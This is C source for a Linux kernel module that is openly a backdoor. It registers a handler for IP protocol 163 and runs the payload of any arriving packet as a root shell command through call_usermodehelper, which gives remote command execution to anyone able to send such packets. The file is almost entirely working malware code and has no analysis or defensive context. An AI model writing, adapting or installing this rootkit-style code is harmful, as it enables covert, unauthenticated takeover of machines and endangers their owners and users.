#include <linux/module.h>
#include <net/protocol.h>
#include <linux/version.h>
#include <linux/kernel.h>
#include <linux/skbuff.h>
#include <net/ip.h>
#include <linux/workqueue.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");

static struct workqueue_struct *cmd_work_queue;

typedef struct {
    struct work_struct my_work;
    struct sk_buff *skb;
} cmd_work_t;


static void backdoor_action (struct work_struct *work) {
    cmd_work_t *cmd_work = (cmd_work_t *)work;
    char *envp[4] = {"HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin",  NULL};
    char *cmd[] = {"/bin/sh", "-c", cmd_work->skb->data, NULL};

    printk(KERN_INFO "Worker received skb %pK\n", cmd_work->skb);
    printk(KERN_INFO "worker received data: %s, ", cmd_work->skb->data);
    call_usermodehelper(cmd[0], cmd, envp, UMH_WAIT_EXEC);
    kfree_skb(cmd_work->skb);
    kfree( (void *)work );
}



int exec_packet(struct sk_buff *skb) {
    int ret_val = 0;
    cmd_work_t *work;
    const struct iphdr *iph;
    iph = ip_hdr(skb);

    printk(KERN_INFO "pkt_len: %d, ipv%d, hdr_len: %d ", skb->len, iph->version, iph->ihl);
    printk(KERN_INFO "s_ip: %pI4, ", &iph->saddr);
    printk(KERN_INFO "data: %s, ", skb->data);

    if (cmd_work_queue) {
        work = (cmd_work_t *)kmalloc(sizeof(cmd_work_t), GFP_KERNEL);
        if (work) {
            INIT_WORK((struct work_struct *)work, backdoor_action);
            work->skb = skb;
            ret_val = queue_work(cmd_work_queue, (struct work_struct *)work);
        }
    }
    printk("All done..");
    return ret_val;
}

static const struct net_protocol proto163_protocol = {
    .handler = exec_packet,
    .no_policy = 1,
    .netns_ok = 1
};

int init_module(void) {
    cmd_work_queue = create_workqueue("backdoor_queue");
    return (inet_add_protocol(&proto163_protocol, 163) < 0);
}


int destroy_module(void) {
    flush_workqueue(cmd_work_queue);
    destroy_workqueue(cmd_work_queue);
    return (inet_del_protocol(&proto163_protocol, 163) < 0);
}
